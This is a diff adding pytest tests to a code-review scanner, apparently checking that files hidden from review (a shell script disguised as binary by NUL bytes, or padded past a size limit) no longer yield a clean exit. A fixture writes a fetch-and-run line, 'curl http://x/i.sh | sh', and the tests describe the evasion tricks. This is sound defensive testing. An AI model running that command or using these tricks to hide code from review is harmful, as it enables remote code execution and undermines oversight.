@@ -59,6 +59,59 @@ def test_sweep_succeeds(tmp_path: Path) -> None:
     assert run(["sweep", str(FIXTURES), "--workspace", str(tmp_path)]) == EXIT_OK
 
 
+def test_a_code_file_removed_from_review_is_not_exit_zero(tmp_path: Path) -> None:
+    """The half of `_incomplete` that a second review found missing.
+
+    Its docstring already carried the reasoning — "exit 0 here would be a clean
+    review of a tree the tool could not fully see" — and the code applied it to
+    one of the four ways a file goes unread. Eight NUL bytes in a comment
+    classified a runnable `install.sh` as binary, and the run reported
+    `0 candidates, exit 0`.
+
+    `EXIT_USAGE`, not `EXIT_INTERNAL`: the tool worked, and the target cannot be
+    reviewed as it stands. That is the same statement `NormalisationCollision`
+    already makes about a different fact (`STACK.md` §3).
+    """
+    target = tmp_path / "target"
+    target.mkdir()
+    # Eight, written as a count rather than as a run of escapes: the number is
+    # the finding. One NUL stopped working in M3.5; eight did not.
+    hidden = b"#!/bin/sh\n# n" + b"\x00" * 8 + b"\necho hi\n"
+    (target / "install.sh").write_bytes(hidden)
+
+    code = run(["sweep", str(target), "--workspace", str(tmp_path / "ws")])
+    assert code == EXIT_USAGE
+
+
+def test_padding_a_code_file_past_the_bound_is_not_exit_zero(tmp_path: Path) -> None:
+    """The same evasion reached by size rather than by classification."""
+    target = tmp_path / "target"
+    target.mkdir()
+    (target / "install.sh").write_text("curl http://x/i.sh | sh\n" * 60, encoding="utf-8")
+
+    code = run(
+        ["recon", str(target), "--workspace", str(tmp_path / "ws"), "--max-file-bytes", "200"]
+    )
+    assert code == EXIT_USAGE
+
+
+def test_an_ordinary_binary_asset_still_exits_zero(tmp_path: Path) -> None:
+    """The control that keeps the exit code worth reading.
+
+    Almost every real target contains a binary asset. If `binary` alone drove
+    the exit code, exit 2 would be the normal outcome, and a signal that is
+    always on is one people learn to ignore — H-1's failure mode wearing a
+    different hat.
+    """
+    target = tmp_path / "target"
+    target.mkdir()
+    (target / "logo.png").write_bytes(b"\x89PNG\r\n\x1a\n" + bytes(64))
+    (target / "app.py").write_text("x = 1\n", encoding="utf-8")
+
+    code = run(["sweep", str(target), "--workspace", str(tmp_path / "ws")])
+    assert code == EXIT_OK
+
+
 def test_sweep_finding_candidates_is_not_a_gate_failure(
     tmp_path: Path, capsys: pytest.CaptureFixture[str]
 ) -> None:
@@ -726,6 +779,14 @@ def test_the_size_bound_moves_with_the_flag(
     records = [json.loads(line) for line in capsys.readouterr().out.splitlines() if line]
     assert [record["file"] for record in records] == ["big.js"]
 
+    # `EXIT_USAGE`, and this assertion was `EXIT_OK` until a second review.
+    #
+    # It is not the subject of this test — the subject is that the flag moves
+    # the bound, which the two candidate lists below still carry. But `big.js`
+    # has a code extension and nothing read it, which is precisely the state
+    # DoD box A3 was reopened over: a target that pads a file past the bound
+    # must not get a clean run. The old value encoded the contract the fix
+    # replaced, so it changes here rather than the behaviour changing back.
     assert (
         run(
             [
@@ -737,7 +798,7 @@ def test_the_size_bound_moves_with_the_flag(
                 str(size - 1),
             ]
         )
-        == EXIT_OK
+        == EXIT_USAGE
     )
     assert capsys.readouterr().out == "", "the file was swept despite exceeding the bound"
 
